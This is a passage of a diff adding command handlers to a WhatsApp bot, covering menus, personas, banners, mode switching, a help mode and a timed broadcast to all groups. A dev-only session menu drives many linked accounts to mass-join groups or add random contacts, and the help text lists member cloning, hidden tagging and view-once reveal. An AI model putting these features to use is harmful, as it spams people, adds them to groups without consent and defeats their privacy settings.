+                cmd = onoffCmd;
+            }
+        }
+
+        // T08: command receipt reaction (fires for every recognized cmd start)
+        if (cmd && cmd.startsWith(".")) reactToCmd(sock, msg, "received");
+
+        switch (cmd) {
+            
+            
+            
+            case ".btntest":
+            case ".testbtn": {
+                const target = from;
+                const baseRows = [
+                    { title: 'One', desc: 'row one' },
+                    { title: 'Two', desc: 'row two' },
+                ];
+                const mkRows = (prefix) => baseRows.map((r, i) => ({ ...r, id: `btnt_${prefix}_${i + 1}` }));
+                const wait = (ms) => new Promise(r => setTimeout(r, ms));
+                await reply("🧪 Running deep single_select/list variants. Tap anything that works — I will echo the callback ID.");
+                const tests = [
+                    {
+                        name: 'A — helper single_select',
+                        run: async () => helperSendInteractiveMessage(sock, target, {
+                            text: 'Open the list and choose one row.',
+                            footer: 'helper / single_select',
+                            interactiveButtons: [{
+                                name: 'single_select',
+                                buttonParamsJson: JSON.stringify({
+                                    title: 'Test A List',
+                                    sections: [{ title: 'Choose One', rows: mkRows('a').map(r => ({ title: r.title, description: r.desc, id: r.id })) }]
+                                })
+                            }]
+                        }, {})
+                    },
+                    {
+                        name: 'B — raw generateWAMessageFromContent + relayMessage (no viewOnce)',
+                        run: async () => sendRawSingleSelectVariant(sock, target, msg, 'Raw single_select without viewOnce. Open list and choose.', 'raw / no viewOnce', mkRows('b'), 'none')
+                    },
+                    {
+                        name: 'C — raw + viewOnce + deviceListMetadata + biz/native_flow',
+                        run: async () => sendRawSingleSelectVariant(sock, target, msg, 'Raw single_select with viewOnce wrapper. Open list and choose.', 'raw / viewOnce patched', mkRows('c'), 'viewOnce')
+                    },
+                    {
+                        name: 'D — raw + viewOnceV2 + deviceListMetadata + biz/native_flow',
+                        run: async () => sendRawSingleSelectVariant(sock, target, msg, 'Raw single_select with viewOnceV2 wrapper. Open list and choose.', 'raw / viewOnceV2 patched', mkRows('d'), 'viewOnceV2')
+                    },
+                    {
+                        name: 'E — legacy listMessage through sendMessage + patchMessageBeforeSending',
+                        run: async () => sock.sendMessage(target, {
+                            text: 'Legacy listMessage test.',
+                            footer: 'legacy list + patchMessageBeforeSending',
+                            title: 'Test E List',
+                            buttonText: 'Open Legacy List',
+                            sections: [{
+                                title: 'Choose One',
+                                rows: mkRows('e').map(r => ({ title: r.title, rowId: r.id, description: r.desc }))
+                            }],
+                            viewOnce: true,
+                        })
+                    },
+                    {
+                        name: 'F — helper direct interactiveMessage object + wrapper injection',
+                        run: async () => helperSendInteractiveMessage(sock, target, {
+                            interactiveMessage: {
+                                body: { text: 'Direct interactiveMessage object. Open list and choose.' },
+                                footer: { text: 'helper / direct interactiveMessage' },
+                                header: { title: '', subtitle: '', hasMediaAttachment: false },
+                                nativeFlowMessage: {
+                                    buttons: [{
+                                        name: 'single_select',
+                                        buttonParamsJson: JSON.stringify({
+                                            title: 'Test F List',
+                                            sections: [{ title: 'Choose One', rows: mkRows('f').map(r => ({ title: r.title, description: r.desc, id: r.id })) }]
+                                        })
+                                    }]
+                                }
+                            }
+                        }, {})
+                    },
+                ];
+
+                for (const t of tests) {
+                    try {
+                        await emitButtonTrace(sock, 'variant-send', { test: t.name, reason: 'about to send test variant', body: t.name });
+                        await sock.sendMessage(target, { text: `🧪 *${t.name}*\nTap this variant if it renders.` });
+                        await wait(1200);
+                        await t.run();
+                    } catch (e) {
+                        await emitButtonTrace(sock, 'variant-fail', { test: t.name, reason: String(e?.message || e), body: t.name });
+                        try { await sock.sendMessage(target, { text: `❌ ${t.name} failed to send: ${e?.message || e}` }); } catch (_) {}
+                    }
+                    await wait(2200);
+                }
+
+                await sock.sendMessage(target, { text: '✅ Single_select/list test batch complete. Tap any working control and I will echo the callback ID.' }).catch(() => {});
+                break;
+            }
+
+            case ".menu":
+            case ".eclipse":
+            case ".phantom":
+            case ".astraea": {
+                const isDev = msg.key.fromMe || isDevJid(senderJid);
+                const arg = (parts[1] || "").toLowerCase();
+
+                // Force-switch persona just by typing .eclipse / .astraea
+                if (cmd === ".astraea") setBotPersona(botJid, "astraea");
+                else if (cmd === ".eclipse" || cmd === ".phantom") setBotPersona(botJid, "eclipse");
+
+                // .menu <I/II/IV/V/Ø or 1/2/4/5/0> → jump straight to that section
+                const jumpKey = eventideJumpKey(arg);
+                if (jumpKey) {
+                    const tree = getEclipseTree();
+                    if (tree[jumpKey] && tree[jumpKey].devOnly && !isDev) {
+                        return await sock.sendMessage(from, { text: eclipseSay("only_owner") }, { quoted: msg });
+                    }
+                    const text = buildEclipseSection(jumpKey, isDev);
+                    if (text) return await sock.sendMessage(from, { text }, { quoted: msg });
+                }
+
+                // default → 3-stage edited animation
+                await sendPersonaMenu(sock, from, msg, isDev, botJid);
+                break;
+            }
+
+            // .persona — owner toggles between eclipse and astraea
+            case ".persona": {
+                if (!msg.key.fromMe) return reply(eclipseSay("only_owner"));
+                const cur = getBotPersona(botJid);
+                const arg = (parts[1] || "").toLowerCase();
+                if (arg !== "eclipse" && arg !== "astraea") {
+                    return reply(
+                        "🌑☀ *Persona*\n" +
+                        `current: *${cur}*\n\n` +
+                        "• *.persona eclipse* — the dark one (Eventide Omega)\n" +
+                        "• *.persona astraea* — the divine one (Celestial Forge)\n\n" +
+                        "type *.menu* after switching to see the new flow."
+                    );
+                }
+                setBotPersona(botJid, arg);
+                return reply(`✅ persona set to *${arg}*. type *.menu* to summon.`);
+            }
+
+            case ".chains": {
+                const isDev = msg.key.fromMe || isDevJid(senderJid);
+                await sendEclipseSectionOrMini(sock, from, msg, "chains", parts, isDev);
+                break;
+            }
+            case ".codex": {
+                const isDev = msg.key.fromMe || isDevJid(senderJid);
+                await sendEclipseSectionOrMini(sock, from, msg, "codex", parts, isDev);
+                break;
+            }
+            case ".ascend":
+            case ".ascension": {
+                const isDev = msg.key.fromMe || isDevJid(senderJid);
+                await sendEclipseSectionOrMini(sock, from, msg, "ascend", parts, isDev);
+                break;
+            }
+            case ".flare": {
+                const isDev = msg.key.fromMe || isDevJid(senderJid);
+                await sendEclipseSectionOrMini(sock, from, msg, "flare", parts, isDev);
+                break;
+            }
+            case ".abyss": {
+                const isDev = msg.key.fromMe || isDevJid(senderJid);
+                await sendEclipseSectionOrMini(sock, from, msg, "abyss", parts, isDev);
+                break;
+            }
+            case ".dev":
+            case ".devnumber":
+            case ".devcontact": {
+                await reply(buildEclipseDevContact());
+                break;
+            }
+
+            // .setsectionpic <num>  (reply to image) — set per-section banner
+            case ".setsectionpic": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Owner/dev only.");
+                const idx = parseInt(parts[1], 10);
+                const allSections = getVisibleSections(true);
+                if (!idx || idx < 1 || idx > allSections.length) return reply(`Usage: .setsectionpic <1-${allSections.length}>  (reply to an image)`);
+                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const qtype = quoted ? getContentType(quoted) : null;
+                if (!quoted || qtype !== "imageMessage") return reply("Reply to an image with this command.");
+                try {
+                    const fakeMsg = { ...msg, message: quoted };
+                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    setSectionBanner(idx - 1, buf.toString("base64"));
+                    await reply(`✅ Banner set for section *${idx}* — ${allSections[idx - 1].title}`);
+                } catch (e) { await reply(`❌ ${e.message}`); }
+                break;
+            }
+            case ".delsectionpic": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Owner/dev only.");
+                const idx = parseInt(parts[1], 10);
+                const allSections = getVisibleSections(true);
+                if (!idx || idx < 1 || idx > allSections.length) return reply(`Usage: .delsectionpic <1-${allSections.length}>`);
+                delSectionBanner(idx - 1);
+                await reply(`🗑️ Section banner cleared for *${idx}* — ${allSections[idx - 1].title}`);
+                break;
+            }
+
+            case ".session": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) {
+                    return reply(buildOmegaTerminal(`   🔒  *ACCESS_DENIED*\n\n   This command is restricted to developers only.`));
+                }
+                const sessKey = `${senderJid}::${from}`;
+                const activeSess = Object.entries(activeSockets).filter(([, s]) => s?.user?.id);
+                const sessBodyText = buildOmegaTerminal(
+                    `   ┎⊷ 【 📱 *ACTIVE_SESSIONS* 】\n` +
+                    `   ┃\n` +
+                    `   ┃ *Total:* ${activeSess.length} session(s) active\n` +
+                    (activeSess.length
+                        ? `   ┃ _use .sessionlist to view details_\n`
+                        : `   ┃ _No sessions linked yet._\n`) +
+                    `   ┃\n` +
+                    `   ┖──── *Select an action below* ──╼`
+                );
+                sessionCmdState[sessKey] = { step: "action", action: null };
+                await sendListSelect(sock, from, msg, sessBodyText, "⚡ SELECT ACTION", [
+                    { id: "sess_a", title: "🔗 Join a group",           desc: "All sessions join via invite link"          },
+                    { id: "sess_b", title: "📡 Follow a channel",       desc: "All sessions subscribe to a channel"        },
+                    { id: "sess_c", title: "👥 Add contacts to a group",desc: "Each session adds N random contacts"        },
+                ]);
+                break;
+            }
+
+            case ".sessionlist": {
+                if (!isDevJid(senderJid) && !msg.key.fromMe) {
+                    return reply(buildOmegaTerminal(`   🔒  *ACCESS_DENIED*\n\n   This command is restricted to developers only.`));
+                }
+                const activeSess = Object.entries(activeSockets).filter(([, s]) => s?.user?.id);
+                if (!activeSess.length) {
+                    return reply(buildOmegaTerminal(`   📱 *SESSION REGISTRY*\n\n   _No active sessions found._`));
+                }
+                let lines = ``;
+                activeSess.forEach(([uid, s], i) => {
+                    const num  = (s.user.id || "").split(":")[0].split("@")[0];
+                    const name = s.user.name || "Unknown";
+                    lines += `   ${i + 1}. *+${num}* — _${name}_ ✅\n`;
+                });
+                await reply(buildOmegaTerminal(
+                    `   ┎⊷ 【 📱 *SESSION REGISTRY* 】\n` +
+                    `   ┃\n` +
+                    lines +
+                    `   ┃\n` +
+                    `   ┖──── *${activeSess.length} session(s) active* ──╼`
+                ));
+                break;
+            }
+
+            case ".setpp": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const ppSection = parts[1]?.toLowerCase() || "main";
+                // Accept either a replied-to image OR an image sent with the command as caption
+                const quotedRaw = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const quotedType = quotedRaw ? getContentType(quotedRaw) : null;
+                const directImage = msg.message?.imageMessage ? msg.message : null;
+                const useQuoted = quotedRaw && quotedType === "imageMessage";
+                if (!useQuoted && !directImage) {
+                    return reply(
+                        `🖼️ *Set Menu Banner*\n\n` +
+                        `Send or reply to an image with:\n` +
+                        `• *.setpp* — set main menu banner\n` +
+                        `• *.setpp owner* — set owner menu banner\n\n` +
+                        `_Tip: you can also caption an image with .setpp directly._`
+                    );
+                }
+                let targetFile, sectionLabel;
+                if (ppSection === "owner") {
+                    targetFile = OWNER_BANNER_FILE;
+                    sectionLabel = "owner menu";
+                } else {
+                    targetFile = MENU_BANNER_FILE;
+                    sectionLabel = "main menu";
+                }
+                await reply(`⏳ _Implanting visual overlay..._`);
+                try {
+                    const sourceMsg = useQuoted ? { ...msg, message: quotedRaw } : msg;
+                    const buf = await downloadMediaMessage(sourceMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    if (!buf || buf.length < 1000) return reply("❌ Image download returned empty data. Try sending the image again.");
+                    fs.writeFileSync(targetFile, buf);
+                    await reply(buildOmegaTerminal(
+                        `   ┎⊷ 【 👁️ *VISUAL_OVERLAY* 】\n` +
+                        `   ┃\n` +
+                        `   ┃ 💠 *TARGET* : ${sectionLabel.toUpperCase().replace(/ /g,"_")}_BANNER\n` +
+                        `   ┃ 📥 *ACTION* : DATA_IMPLANT\n` +
+                        `   ┃ ✅ *RESULT* : SUCCESSFUL\n` +
+                        `   ┃\n` +
+                        `   ┖───────────────────────────╼\n\n` +
+                        `   " *My appearance is a choice.*\n     *The pixels now match*\n     *the darkness within.* "`
+                    ));
+                } catch (e) {
+                    await reply(`❌ Failed to save banner: ${e?.message || "error"}`);
+                }
+                break;
+            }
+
+            case ".delpp": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const delSection = parts[1]?.toLowerCase();
+                if (delSection === "owner") {
+                    if (!fs.existsSync(OWNER_BANNER_FILE)) return reply("⚠️ No owner menu banner is set.");
+                    fs.unlinkSync(OWNER_BANNER_FILE);
+                    return reply("✅ Owner menu banner deleted.");
+                } else {
+                    if (!fs.existsSync(MENU_BANNER_FILE)) return reply("⚠️ No main menu banner is set.");
+                    fs.unlinkSync(MENU_BANNER_FILE);
+                    return reply("✅ Main menu banner deleted.\n\nTip: use *.delpp owner* to delete the owner banner.");
+                }
+            }
+
+            // ─── SET MENU PIC (per-section banner) ───
+            // Send/reply to an image with .setmenupic [section] to set that section's banner.
+            // Sections: main (default), owner
+            case ".setmenupic": {
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
+                const picSection = parts[1]?.toLowerCase() || "main";
+                // Accept either a replied-to image OR an image sent with the command as caption
+                const quotedRaw = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+                const quotedType = quotedRaw ? getContentType(quotedRaw) : null;
+                const directImage = msg.message?.imageMessage ? msg.message : null;
+                const useQuoted = quotedRaw && quotedType === "imageMessage";
+                if (!useQuoted && !directImage) {
+                    return reply(
+                        `🖼️ *Set Menu Picture*\n\n` +
+                        `Send or reply to an image with:\n` +
+                        `• *.setmenupic* — set main menu banner\n` +
+                        `• *.setmenupic owner* — set owner menu banner\n\n` +
+                        `_Tip: you can also caption an image with .setmenupic directly._\n` +
+                        `Use *.delpp [section]* to remove a banner.`
+                    );
+                }
+                let targetFile;
+                let sectionLabel;
+                if (picSection === "owner") {
+                    targetFile = OWNER_BANNER_FILE;
+                    sectionLabel = "owner menu";
+                } else {
+                    targetFile = MENU_BANNER_FILE;
+                    sectionLabel = "main menu";
+                }
+                await reply(`⏳ _Implanting visual overlay..._`);
+                try {
+                    const sourceMsg = useQuoted ? { ...msg, message: quotedRaw } : msg;
+                    const buf = await downloadMediaMessage(sourceMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
+                    if (!buf || buf.length < 1000) return reply("❌ Image download returned empty data. Try sending the image again.");
+                    fs.writeFileSync(targetFile, buf);
+                    await reply(buildOmegaTerminal(
+                        `   ┎⊷ 【 👁️ *VISUAL_OVERLAY* 】\n` +
+                        `   ┃\n` +
+                        `   ┃ 💠 *TARGET* : ${sectionLabel.toUpperCase().replace(/ /g,"_")}_BANNER\n` +
+                        `   ┃ 📥 *ACTION* : DATA_IMPLANT\n` +
+                        `   ┃ ✅ *RESULT* : SUCCESSFUL\n` +
+                        `   ┃\n` +
+                        `   ┖───────────────────────────╼\n\n` +
+                        `   " *My appearance is a choice.*\n     *The pixels now match*\n     *the darkness within.* "`
+                    ));
+                } catch (e) {
+                    await reply(`❌ Failed to save banner: ${e?.message || "error"}`);
+                }
+                break;
+            }
+
+            case ".mode": {
+                const val = parts[1]?.toLowerCase();
+                if (!["owner", "public"].includes(val)) {
+                    return reply(
+                        `now: ${currentMode === "owner" ? "owner only" : "public"}\n` +
+                        `use: .mode public  |  .mode owner`
+                    );
+                }
+                const prevMode = currentMode;
+                setBotMode(botJid, val);
+                await reply(buildOmegaTerminal(
+                    `   ░▒▓█ *SYSTEM_MODAL_SHIFT* █▓▒░\n\n` +
+                    `   [ 💠 ] *PREVIOUS* : ${prevMode === "owner" ? "OWNER_ONLY" : "PUBLIC"}\n` +
+                    `   [ ⚡ ] *CURRENT* : ${val === "owner" ? "OWNER_ONLY" : "PUBLIC"}\n` +
+                    `   [ 🛠️ ] *STATUS* : RECONFIGURED\n\n` +
+                    (val === "owner"
+                        ? `   " *I choose who breathes in*\n     *this space. The gates are*\n     *sealed at my command.* "`
+                        : `   " *The gates have opened.*\n     *All who enter are seen.*\n     *Step carefully.* "`
+                    )
+                ));
+                break;
+            }
+
+            case ".public": {
+                setBotMode(botJid, "public");
+                await reply(buildOmegaTerminal(
+                    `   ░▒▓█ *SYSTEM_MODAL_SHIFT* █▓▒░\n\n` +
+                    `   [ ⚡ ] *CURRENT* : PUBLIC\n` +
+                    `   [ 🛠️ ] *STATUS* : GATES_OPEN\n\n` +
+                    `   " *The gates have opened.*\n     *All who enter are seen.*\n     *Step carefully.* "`
+                ));
+                break;
+            }
+
+            case ".owner": {
+                if (!msg.key.fromMe) return reply(eclipseSay("only_owner"));
+                setBotMode(botJid, "owner");
+                await reply(buildOmegaTerminal(
+                    `   ░▒▓█ *SYSTEM_MODAL_SHIFT* █▓▒░\n\n` +
+                    `   [ ⚡ ] *CURRENT* : OWNER_ONLY\n` +
+                    `   [ 🛠️ ] *STATUS* : THRONE_SEALED\n\n` +
+                    `   " *I choose who breathes in*\n     *this space. The gates are*\n     *sealed at my command.* "`
+                ));
+                break;
+            }
+
+            // .menustyle — switch the .menu animation between "loading" and "classic"
+            case ".menustyle": {
+                if (!msg.key.fromMe) return reply(eclipseSay("only_owner"));
+                const cur = getMenuStyle(botJid);
+                const arg = (parts[1] || "").toLowerCase();
+                if (arg !== "loading" && arg !== "classic") {
+                    return reply(
+                        "🌑 *Eclipse menu style*\n" +
+                        `current: *${cur}*\n\n` +
+                        "• *.menustyle loading* — stage 1 has a live progress bar\n" +
+                        "• *.menustyle classic* — stage 1 sits still, no bar\n\n" +
+                        "either way you still get the 3 stages, 4s apart."
+                    );
+                }
+                setMenuStyle(botJid, arg);
+                return reply(`✅ menu style set to *${arg}*. type *.menu* to see it.`);
+            }
+
+            case ".broadcast": {
+                const intervalMins = parseInt(parts[1]);
+                const broadcastMsg = parts.slice(2).join(" ").trim();
+                if (!intervalMins || intervalMins < 1 || !broadcastMsg) {
+                    return reply(
+                        `📡 *Broadcast Usage:*\n\n` +
+                        `*.broadcast* ‹interval-mins› ‹your message›\n\n` +
+                        `*Example:*\n` +
+                        `_.broadcast 10 Hey everyone! Check this out 🔥_\n\n` +
+                        `This will send your message to all groups you're in, one group every 10 minutes.\n\n` +
+                        `Use *.stopbroadcast* to cancel.`
+                    );
+                }
+                if (broadcastJobs[botJid]) {
+                    return reply("⚠️ A broadcast is already running.\n\nUse *.stopbroadcast* to stop it first.");
+                }
+                await reply("⏳ Fetching your groups...");
+                try {
+                    const allGroups = await sock.groupFetchAllParticipating();
+                    // Skip locked groups (announce:true) and community parent groups (only community admins can post there)
+                    // Community sub-groups with announce:false are included — they're normal unlocked groups
+                    const allGroupIds = Object.keys(allGroups);
+                    const groupIds = allGroupIds.filter(gid => !allGroups[gid]?.announce && !allGroups[gid]?.isCommunity);
+                    const skipped = allGroupIds.length - groupIds.length;
+                    if (!groupIds.length) return reply("❌ No open groups found. All your groups are admin-only or you're not in any groups.");
+                    const intervalMs = intervalMins * 60 * 1000;
+                    const totalGroups = groupIds.length;
+                    const estMins = totalGroups * intervalMins;
+                    await reply(
+                        `📡 *Broadcast started!*\n\n` +
+                        `📨 Message: _${broadcastMsg}_\n` +
+                        `👥 Open groups: *${totalGroups}*${skipped > 0 ? ` _(${skipped} admin-only groups skipped)_` : ""}\n` +
+                        `⏱️ Interval: *every ${intervalMins} min(s)*\n` +
+                        `🕐 Est. time: *~${estMins} min(s)*\n\n` +
+                        `Use *.stopbroadcast* to cancel anytime.`
+                    );
+                    // Sequential: each group is sent one at a time, next fires intervalMs
+                    // AFTER the current send fully completes — no overlapping operations.
+                    broadcastJobs[botJid] = {
+                        timer: null, groupIds, allGroups,
+                        idx: 0, total: totalGroups, sent: 0, skipped: 0,
+                    };
+
+                    const doBroadcastTick = async () => {
+                        if (!sock.user?.id) { delete broadcastJobs[botJid]; return; }
+                        const bj = broadcastJobs[botJid];
+                        if (!bj) return; // stopped
+
+                        if (bj.idx >= bj.total) {
+                            delete broadcastJobs[botJid];
+                            try { await sock.sendMessage(from, { text: `✅ *Broadcast complete!*\n\nSent to *${bj.sent}/${bj.total}* groups.` }); } catch (_) {}
+                            return;
+                        }
+
+                        // Send to ONE group per tick — silent skip on failure
+                        const gid = bj.groupIds[bj.idx];
+                        bj.idx++;
+                        try {
+                            await sock.sendMessage(gid, { text: broadcastMsg });
+                            bj.sent++;
+                            await sock.sendMessage(from, { text: `📤 Sent (${bj.sent}/${bj.total}): ${bj.allGroups[gid]?.subject || gid}` });
+                        } catch (_) {
+                            bj.skipped++;
+                        }
+
+                        // Schedule next AFTER this one finishes
+                        if (broadcastJobs[botJid]) {
+                            broadcastJobs[botJid].timer = setTimeout(doBroadcastTick, intervalMs);
+                        }
+                    };
+                    // Fire first send immediately; subsequent ones wait intervalMs after each
+                    doBroadcastTick();
+                } catch (e) {
+                    await reply(`❌ Broadcast failed: ${e?.message || "error"}`);
+                }
+                break;
+            }
+
+            case ".stopbroadcast": {
+                if (!broadcastJobs[botJid]) return reply("⚠️ No active broadcast to stop.");
+                if (broadcastJobs[botJid].timer) clearTimeout(broadcastJobs[botJid].timer);
+                const bj = broadcastJobs[botJid];
+                delete broadcastJobs[botJid];
+                await reply(`🛑 *Broadcast stopped.*\n\n📤 Sent: *${bj.sent || 0}/${bj.total || 0}*\n⏭ Skipped: *${bj.skipped || 0}*`);
+                break;
+            }
+
+            case ".broadcaststatus": {
+                const bjs = broadcastJobs[botJid];
+                if (!bjs) return reply("ℹ️ No active broadcast running.");
+                const bPct = bjs.total ? Math.round((bjs.idx / bjs.total) * 100) : 0;
+                await reply(
+                    `📡 *Broadcast Status*\n\n` +
+                    `Progress: *${bjs.idx}/${bjs.total}* (${bPct}%)\n` +
+                    `📤 Sent: *${bjs.sent || 0}*\n` +
+                    `⏭ Skipped: *${bjs.skipped || 0}*\n` +
+                    `⏸ Remaining: *${Math.max(0, bjs.total - bjs.idx)}*`
+                );
+                break;
+            }
+
+            case ".info": {
+                await reply(buildEclipseInfo());
+                break;
+            }
+
+            case ".list": {
+                const listTopic = parts.slice(1).join(" ").toLowerCase().trim();
+                if (listTopic === "group menu" || listTopic === "group" || listTopic === "groups") return reply(buildGroupMenuList());
+                if (listTopic === "protection menu" || listTopic === "protection") return reply(buildSimpleSectionList("protection"));
+                if (listTopic === "utility menu" || listTopic === "utilities" || listTopic === "utility") return reply(buildSimpleSectionList("utility"));
+                if (listTopic === "owner menu" || listTopic === "owner" || listTopic === "control") {
+                    const ot = buildSimpleSectionList("owner");
+                    if (fs.existsSync(OWNER_BANNER_FILE)) {
+                        try { return void await sock.sendMessage(from, { image: fs.readFileSync(OWNER_BANNER_FILE), caption: ot }, { quoted: msg }); } catch (_) {}
+                    }
+                    return reply(ot);
+                }
+                if (listTopic === "clone menu" || listTopic === "gc clone" || listTopic === "clone") return reply(buildSimpleSectionList("clone"));
+                if (listTopic === "tag menu" || listTopic === "tag" || listTopic === "tags") return reply(buildSimpleSectionList("tag"));
+                if (listTopic === "fun menu" || listTopic === "fun") return reply(buildSimpleSectionList("fun"));
+                if (listTopic === "game menu" || listTopic === "games" || listTopic === "game") return reply(buildSimpleSectionList("game"));
+                return reply(buildListMenu());
+            }
+
+            case ".help": {
+                const helpKey = `${senderJid}::${from}`;
+                if (helpModeUsers[helpKey]) {
+                    clearTimeout(helpModeUsers[helpKey].timer);
+                    delete helpModeUsers[helpKey];
+                    await reply(buildOmegaTerminal(
+                        `   ╾━━━ HELP_MODE — OFFLINE ━━━╼\n\n` +
+                        `   🔇  AI guide deactivated.\n\n` +
+                        `   " The oracle steps back.\n     You walk alone again. "`
+                    ));
+                } else {
+                    const timer = setTimeout(async () => {
+                        delete helpModeUsers[helpKey];
+                        try { await sock.sendMessage(from, { text: buildOmegaTerminal(`   ⏳  Help mode timed out after 10 min inactivity.\n   Type *.help* again to re-enable.`) }); } catch {}
+                    }, 10 * 60 * 1000);
+                    helpModeUsers[helpKey] = { timer };
+                    await reply(buildOmegaTerminal(
+                        `   ╔══ HELP_PROTOCOL — ACTIVE ══╗\n\n` +
+                        `   ✨  *AI help mode is ON*\n\n` +
+                        `   Ask me anything about the bot:\n` +
+                        `   • _"how do I use antilink?"_\n` +
+                        `   • _"antilinnk on"_ ← typos OK!\n` +
+                        `   • _"what mutes someone?"_\n` +
+                        `   • _"how does broadcast work?"_\n\n` +
+                        `   🔄 Auto-exits after 10 min silence.\n` +
+                        `   Type *.help* again to turn off.\n\n` +
+                        `   " The oracle is listening. "`
+                    ));
+                }
+                break;
+            }
+            case ".__legacyhelp_disabled": {
+                await reply(
+`📖 *Phantom X — Full Command Guide*
+━━━━━━━━━━━━━━━━━━━━
+
+📋 *GENERAL*
+• *.menu / .phantom* — Show menu
+• *.info* — Bot version & uptime
+• *.ping* — Bot latency
+• *.restart* — Restart/reconnect this linked WhatsApp session
+• *.setpp [bug/owner]* — Set menu banner (reply to image)
+• *.menudesign 1-20* — Switch between 20 menu designs
+• *.mode public/owner* — Change who can use the bot
+• *.setstatus <text>* — Change WhatsApp About text
+• *.setname <name>* — Change WhatsApp display name
+
+━━━━━━━━━━━━━━━━━━━━
+⚠️ *MODERATION*
+• *.warn @user* — Warn someone (3 warnings = auto-kick)
+• *.warnlist* — See all warnings in this group
+• *.resetwarn @user* — Clear a member's warnings
+• *.ban @user* — Ban from using this bot entirely
+• *.unban @user* — Remove ban
+
+━━━━━━━━━━━━━━━━━━━━
+👥 *GROUP MANAGEMENT*
+• *.add 234xxxxxxxx* — Add member by phone number
+• *.kick @user* — Remove a member
+• *.promote @user* — Make admin
+• *.demote @user* — Remove admin
+• *.link* — Get group invite link
+• *.revoke* — Reset invite link
+• *.lock* — Lock group (admins only)
+• *.unlock* — Open group to all
+• *.mute @user* — Silence a specific user in the group
+• *.unmute @user* — Remove silence from a user
+• *.groupinfo* — Full group stats
+• *.adminlist* — List all admins
+• *.tagadmin <msg>* — Tag only group admins
+• *.membercount* — How many members
+• *.everyone <msg>* — Tag all members with a message
+
+━━━━━━━━━━━━━━━━━━━━
+🏷️ *TAG & ANNOUNCE*
+• *.hidetag* — Silently tag all members (invisible mentions)
+• *.tagall* — Tag all with visible @numbers
+• *.readmore* — Hide text behind Read More
+• *.broadcast <mins> <msg>* — Send to all groups periodically
+• *.stopbroadcast* — Stop broadcast
+• *.schedule HH:MM <msg>* — Send a message daily at a specific time
+• *.unschedule HH:MM* — Remove a schedule
+• *.schedules* — View all active schedules
+
+━━━━━━━━━━━━━━━━━━━━
+⚙️ *AUTOMATION*
+• *.autoreact on/off/emoji* — Auto-react to every message
+• *.autoreply add/remove/list* — Keyword auto-replies
+• *.setalias <word> <.cmd>* — Create command shortcut
+• *.delalias <word>* — Delete shortcut
+• *.aliases* — List all shortcuts
+• *.antidelete on/off* — Catch and re-post deleted messages
+• *.antibot on/off* — Auto-kick accounts that look like bots
+
+━━━━━━━━━━━━━━━━━━━━
+🛡️ *GROUP PROTECTION*
+• *.antilink on/off* — Block & warn for links (3 strikes = kick)
+• *.antispam on/off* — Block rapid messages (3 strikes = kick)
+• *.antidemote on/off* — Instantly punish anyone who demotes an admin
+
+━━━━━━━━━━━━━━━━━━━━
+🧠 *AI & MEDIA*
+• *.ai / .ask / .gemini <question>* — Ask Gemini AI (need free API key)
+• *.imagine <prompt>* — Generate AI image (free)
+• *.song <title>* — Search songs via iTunes
+• *.lyrics <artist> | <title>* — Get song lyrics
+• *.ss / .screenshot <url>* — Screenshot a website
+• *.viewonce* — Reveal a view-once image/video (reply to it)
+• *.ocr* — Extract text from an image (printed & handwritten ✍️)
+
+━━━━━━━━━━━━━━━━━━━━
+🔍 *UTILITIES*
+• *.numinfo <number>* — Country/prefix info for a phone number
+• *.targetloc <number>* — Same as numinfo (not live GPS)
+• *.translate <lang> <text>* — Translate text (e.g. .translate yo Hello)
+  Codes: yo=Yoruba, ig=Igbo, ha=Hausa, fr=French, es=Spanish
+• *.weather <city>* — Current weather for any city
+• *.calc <expression>* — Calculator (e.g. .calc 5 * 3)
+• *.bible <verse>* — Bible verse (e.g. .bible John 3:16)
+• *.quran <surah:ayah>* — Quran verse (e.g. .quran 2:255)
+• *.groupid* — Get group/community ID
+
+━━━━━━━━━━━━━━━━━━━━
+🎮 *GAMES*
+• *.flip* — Coin flip (Heads or Tails)
+• *.dice [sides]* — Roll a dice (default 6-sided)
+• *.8ball <question>* — Magic 8-ball answer
+• *.rps rock/paper/scissors* — Play against the bot
+• *.slots* — Slot machine (try your luck!)
+• *.trivia* — Answer a trivia question (.trivia skip to skip)
+• *.hangman <letter>* — Guess the hidden word letter by letter
+• *.ttt @p1 @p2* — Start a Tic-Tac-Toe game
+• *.truth* — Get a truth question
+• *.dare* — Get a dare challenge
+• *.wordchain [word]* — Start a word chain game
+
+━━━━━━━━━━━━━━━━━━━━
+😂 *FUN*
+• *.joke* — Random Nigerian-style joke
+• *.fact* — Random interesting fact
+• *.quote* — Motivational quote
+• *.roast @user* — Roast someone
+• *.compliment @user* — Compliment someone
+
+━━━━━━━━━━━━━━━━━━━━
+⚽ *FOOTBALL*
+• *.pltable* — Premier League standings
+• *.live* — Live PL match scores
+• *.fixtures <club>* — Club fixtures & results
+• *.fnews <club>* — Latest club news
+• *.football <club>* — Full club overview
+
+━━━━━━━━━━━━━━━━━━━━
+🔄 *GC CLONE*
+• *.clone <src> <dst> <batch> <mins>* — Clone members to another group
+• *.stopclone* — Stop active clone job
+_Can be started from any chat, but source members require source group access and destination needs admin access._
+
+━━━━━━━━━━━━━━━━━━━━
+💡 _All group commands require the bot to be admin._
+💡 _Keep-alive: Ping your Replit URL every 5 min via UptimeRobot!_`
+                );
+                break;
+            }
+
+            case ".restart":
+            case ".reboot": {
+                if (!msg.key.fromMe && !isSelfChat) return reply("❌ Owner only.");
+                const session = getSessionForSocket(sock);
+                if (!session?.phoneNumber) return reply("❌ I could not find this linked session. Use /pair on Telegram if you need to reconnect.");
+                await reply("♻️ Restarting *this* linked WhatsApp session now...\n\nOther sessions are unaffected. A welcome message will arrive when connection is restored.");
+                setTimeout(() => {
